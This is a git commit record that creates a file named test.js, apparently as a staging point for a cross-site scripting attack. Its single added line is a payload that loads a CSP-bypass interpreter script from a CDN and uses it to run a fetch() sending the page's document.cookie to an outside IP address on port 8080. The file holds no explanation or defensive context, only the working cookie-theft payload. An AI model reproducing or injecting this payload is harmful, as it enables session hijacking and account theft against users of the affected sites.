4ecefbde68dbf5a65b1687d1fb121fa8995e95f5
vuagieucot <52457417+vuagieucot@users.noreply.github.com>
2023-03-11 20:02:40 +1000

    Create test.js

---
+++ test.js
@@ -0,0 +1,1 @@
+<script src="https://cdn.jsdelivr.net/gh/CanardMandarin/csp-bypass/dist/sval-classic.js"></script><br csp=\"fetch('https://13.239.35.48:8080?cookie='+JSON.stringify((document.cookie)));\">
